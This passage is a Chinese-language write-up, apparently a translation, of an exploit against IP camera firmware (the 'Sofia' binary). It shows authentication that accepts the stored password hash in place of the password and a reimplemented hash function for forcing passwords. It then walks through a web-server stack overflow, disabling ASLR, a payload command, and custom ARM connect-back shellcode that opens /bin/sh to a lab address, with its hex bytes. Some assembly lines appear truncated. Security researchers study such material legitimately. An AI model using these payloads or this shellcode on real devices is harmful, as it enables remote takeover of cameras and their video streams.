    admin$
认证算法还有一个有趣的结果：在某些情况下，认证函数不仅接受密码，还接受散列。不仅可以通过密码而且可以通过hash（存储在/ mnt / mtd /
Config / Account1中）打开rtsp视频流。例如，`tlJwpbo6`是空密码的hash值（参见下一节），因此
    cvlc 'rtsp://192.168.88.127:554/user=admin&password=&channel=1&stream=0.sdp'
    cvlc 'rtsp://192.168.88.127:554/user=admin&password=tlJwpbo6&channel=1&stream=0.sdp'
同样有效。
## 密码散列函数
auth函数（更深层）静态分析的另一个结果：密码散列函数是`sub_3DD5E4`。它基本上是带有一些奇怪转换的MD5。逆向并在Python中实现:
    import hashlib
    def sofia_hash(msg):
        h = ""
        m = hashlib.md5()
        m.update(msg)
        msg_md5 = m.digest()
        for i in range(8):
            n = (ord(msg_md5[2*i]) + ord(msg_md5[2*i+1])) % 0x3e
            if n > 9:
                if n > 35:
                    n += 61
                else:
                    n += 55
            else:
                n += 0x30
            h += chr(n)
        return h
执行hash算法，可以强制使用密码或设置任意密码。
# 内置webserver中的缓冲区溢出
Sofia二进制文件处理端口80/tcp上的HTTP请求。让我们试着对这些要求进行混淆处理。当然，附加gdb
(见上文)应该会有所帮助。实际上，我们应该终止Sofia进程，并使用gdbserver重新启动它，以查看控制台输出：
    $ kill 610
    $ /mnt/mtd/gdbserver :2000 /var/Sofia
在本地：
    $ gdb -q -ex 'set gnutarget elf32-littlearm' -ex 'target remote 192.168.88.127:2000'
    gef>  c
现在让我们看看GET请求。没有回应：
    $ echo 'GET /' | nc 192.168.88.127 80
正常响应（即使没有正确的关闭）：
    $ echo -ne'GET / HTTP'| nc 192.168.88.127 80
用looong请求测试是否有溢出:
    $ python -c 'print "GET " + "a"*1000 + " HTTP"' |  nc 192.168.88.127 80
很好，响应是200，带有“404 File Not Found”消息，但我们可以在gdb中看到一个精彩的崩溃。;）  
请注意，Sofia应用程序启用了watchdog内核模块。如果它有一分钟没有运行，设备将重新启动。如果我们用远程设备进行实验，这一方面是好的，但是如果我们想顺利地进行调试，那么很糟糕。  
watchdog一旦启动就无法关闭，因此摆脱它的唯一方法是通过重新刷新来修改只读固件。除非我们想要测试我们的设备，否则不建议使用。;）
## 程序流控制
（在攻击者看来）为什么这次崩溃如此美妙？远程进程Sofia得到了SIGSEGV (分段错误)，堆栈中充满了我们的“a”字符，但最重要的是: $pc
(程序计数器)寄存器中有我们注入的值`0x61616160`（“aaaa” -1）(可能是由ret触发的，但原因并不重要)。这应该是经典的堆栈溢出，这意味着我们有机会轻松控制程序流。  
经过一些实验（间隔减半） :
    $ python -c 'print "GET " + "0123" + "a"*(299-4) + "wxyz" + " HTTP"' |  nc 192.168.88.127 80
这也导致了SIGSEGV，并且$ pc寄存器是`0x7a797876` （〜“wxyz”;相反，因为字节排序是little-endian;而-1是因为对齐）。payload在$ sp + 0x14（堆栈基址+ 0x14）处开始（带有“0123aaa ...”）。
## 远程代码执行
最容易和有效地利用这种溢出是通过将一些shellcode注入堆栈并将程序流重定向到那里。这样我们就可以在目标上获得任意的远程代码执行。由于设备操作系统上没有权限分离，这意味着完全控制（root
shell访问）。  
但是，启用漏洞利用缓解技术可能会使攻击者更难入侵。  
防止堆栈上的shellcode的最基本方法是No-eXecute（NX）位技术。这可以防止在选定的内存页面上（通常是具有写入权限的页面，如堆栈）执行代码。幸运的是（从攻击者看来;）），没有NX位设置（查看STACK标志，rwx）：
    $ objdump -b elf32-littlearm -p Sofia
    Sofia:     file format elf32-littlearm
    Program Header:
    0x70000001 off    0x00523f34 vaddr 0x0052bf34 paddr 0x0052bf34 align 2**2
             filesz 0x000132a8 memsz 0x000132a8 flags r--        LOAD off    0x00000000 vaddr 0x00008000 paddr 0x00008000 align 2**15
             filesz 0x005371dc memsz 0x005371dc flags r-x
        LOAD off    0x005371dc vaddr 0x005471dc paddr 0x005471dc align 2**15
             filesz 0x000089c8 memsz 0x000dad8c flags rw-         TLS off    0x005371dc vaddr 0x005471dc paddr 0x005471dc align 2**2
             filesz 0x00000004 memsz 0x00000018 flags r--       STACK off    0x00000000 vaddr 0x00000000 paddr 0x00000000 align 2**2
             filesz 0x00000000 memsz 0x00000000 flags rwx
    private flags = 5000002: [Version5 EABI]
或者在gdb gef中使用`checksec`。gdb
gef中的`checksec`也告诉我们没有其他的缓解措施，例如堆栈canary（这很明显，因为如果存在堆栈canary，我们无法控制带有堆栈溢出的$
pc）。  
在获取RCE工作之前，我们唯一应该知道的是堆栈地址。我们应该在payload的适当位置（上文中的“wxyz”）注入地址$sp+0x14，以便将程序流重定向到shellcode。  
还有一种缓解技术可以使这变得更加困难（或者非常困难，在某些情况下几乎不可能）：地址空间布局随机化（ASLR）。ASLR随机化存储器段的基址（例如，堆栈的基址）。  
运气不好，ASLR被启用（“2”表示完全随机化，“0”被禁用）:
    $ cat / proc / sys / kernel / randomize_va_space
    2
### 没有ASLR的RCE
让我们先尝试在ASLR关闭的情况下利用溢出。
    $ echo 0 > /proc/sys/kernel/randomize_va_space
按照上面的过程，我们得到SIGSEGV崩溃时堆栈地址（$ sp）是0x5a26f3d8（并且在ASLR关闭的不同运行中它是相同的）。  
因此payload应该是：
    python -c 'print "GET " + shellcode + "a"*(299-len(shellcode)) + "\xd8\xf3\x26\x5a" + " HTTP"' | nc 192.168.88.127 80
其中shellcode应该是我们想要执行的，最好是connectback shellcode。请注意，必须避免“badchars”： 0x00, 0x0d
('\n'), 0x20 (' '), 0x26 ('&'), 0x3f
('?')。此外，还有299字节的大小限制。Shellcode生成器无法处理我们的badchar列表，​​即使使用自动编码器也无法解决问题（因为大小限制）。  
因此应该生成自定义shellcode。这里的shellcode使用socket，connect，dup2和execve系统调用（或根据ARM世界的术语进行管理程序调用）给出了一个连接shell。我们必须严格且具有创造性，以避免犯错。这些只是为了便于阅读的标签不应被使用。
    .section    .text
    .global     _start
    @ ensure switching to thumb mode (arm mode instructions)
    .code 32
    _0:    add  r1, pc, #1
    _4:    bx   r1
    @ thumb mode instructions
    _start:
    .code 16
    @ *0x52 -= 1 (port -= 0x100; make it possible to use port numbers  *0x52
    @ socket(2, 1, 0) = socket(AF_INET, SOCK_DGRAM, 0)
    _10:   mov  r1, #2          @ r1  *0x50
    _26:   mov  r2, #16          @ r2 0 (dup2 every fd to the socket)
    @ execve('/bin/sh', NULL, NULL)
    _3a:   add  r0, pc, #28     @ r0  *(0x58+7), terminate '/bin/sh' with \x00
    _40:   push {r0, r2}        @ *sp <- {r0, r1, r2} = {0x58, 0x0, 0x0}
    _42:   mov  r1, sp          @ r1 <- sp
    _44:   mov  r7, #11         @ r7 <- 11
    _46:   svc  1               @ svc_11(r0, r1, r2) = execve('/bin/sh\x00', ['/bin/sh\x00', 0], 0)
    _48:   mov  r7, #1          @ r7 <- 1
    _4a:   add  r0, r7, #0      @ r0 <- r7 + 0 = 1
    _4c:   svc  1               @ svc_1(r0) = exit(1)
    _4e:   nop
    @ struct sockaddr (sa_family = 0x0002 (set by shellcode), sa_data = (port, ip) )
    _50:   .short 0xffff
    _52:   .short 0x697b            @ port 31377 (hex(31337+0x100) in little-endian)
    _54:   .byte 192,168,88,100     @ inet addr: 192.168.88.100
    _58:   .ascii "/bin/shX"        @ 'X' will be replaced with \x00 by the shellcode
    .word 0xefbeadde        @ deadbeef ;)
编译shellcode并获取原始二进制字节（使用ARM的任何交叉工具都可以工作，例如使用buildroot构建的工具
`buildroot-2017.02.5/output/host/usr/bin/`也可以）：
    $ armv7a-hardfloat-linux-gnueabi-as shellcode.S -o shellcode.o
    $ armv7a-hardfloat-linux-gnueabi-ld.bfd shellcode.o -o shellcode
    $ armv7a-hardfloat-linux-gnueabi-objcopy -O binary --only-section=.text ./shellcode ./shellcode.bin
    $ cat shellcode.bin | xxd -p
    01108fe211ff2fe111a18a78013a8a700221081c0121921a0f02193701df
    061c0ba102230b801022023701df3e270137c821301c01df0139fbd507a0
    921ac27105b469460b2701df0127381c01dfc046ffff7b69c0a858642f62